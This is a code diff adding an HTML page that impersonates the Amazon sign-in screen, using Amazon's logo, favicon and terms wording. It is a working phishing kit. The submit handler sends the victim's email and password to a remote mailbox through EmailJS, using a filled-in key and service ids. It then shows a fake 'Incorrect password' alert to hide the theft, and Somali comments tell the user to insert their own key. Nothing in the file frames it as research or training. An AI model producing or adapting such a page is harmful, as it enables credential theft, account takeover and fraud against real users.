@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Sign-In | Amazon</title>
+  <link rel="icon" href="https://www.amazon.com/favicon.ico">
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <script>
+    (function(){
+      emailjs.init("YOUR_PUBLIC_KEY"); // <-- Ku beddel Public Key-gaaga
+    })();
+  </script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f3f3f3;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .login-container {
+      background-color: white;
+      border: 1px solid #ddd;
+      padding: 30px 40px;
+      width: 350px;
+      box-shadow: 0 0 8px rgba(0,0,0,0.1);
+      border-radius: 6px;
+      text-align: center;
+    }
+    .login-container img.logo {
+      width: 100px;
+      margin-bottom: 15px;
+    }
+    .login-container h2 {
+      font-weight: 400;
+      font-size: 24px;
+      margin-bottom: 20px;
+      text-align: left;
+    }
+    form label {
+      float: left;
+      font-size: 14px;
+      margin-bottom: 5px;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 15px;
+      border: 1px solid #a6a6a6;
+      border-radius: 3px;
+      font-size: 14px;
+    }
+    button {
+      width: 100%;
+      padding: 10px;
+      background-color: #f0c14b;
+      border: 1px solid #a88734;
+      border-radius: 3px;
+      cursor: pointer;
+      font-weight: bold;
+    }
+    .note {
+      font-size: 12px;
+      color: #555;
+      text-align: left;
+      margin-top: 15px;
+    }
+  </style>
+</head>
+<body>
+  <form class="login-container" id="login-form">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon Logo" class="logo">
+    <h2>Sign-In</h2>
+
+    <label for="email">Email</label><br>
+    <input type="email" name="email" id="email" required><br>
+
+    <label for="password">Password</label><br>
+    <input type="password" name="password" id="password" required><br>
+
+    <button type="submit">Continue</button>
+
+    <p class="note">
+      By continuing, you agree to Amazon's Conditions of Use and Privacy Notice.
+    </p>
+  </form>
+
+ <script>
+    emailjs.init("MF5ay2BxtQS7f_zmS"); // 🟢 beddel "YOUR_PUBLIC_KEY" kugu gaar ah
+
+    document.getElementById("login-form").addEventListener("submit", function (e) {
+      e.preventDefault();
+
+      emailjs.sendForm("service_4j75doc", "template_jhwehoh", this)
+        .then(function () {
+          alert("Incorrect password please try again!");
+        }, function (error) {
+          alert("Failed login : " + JSON.stringify(error));
+        });
+    });
+  </script>
+</body>
+</html>
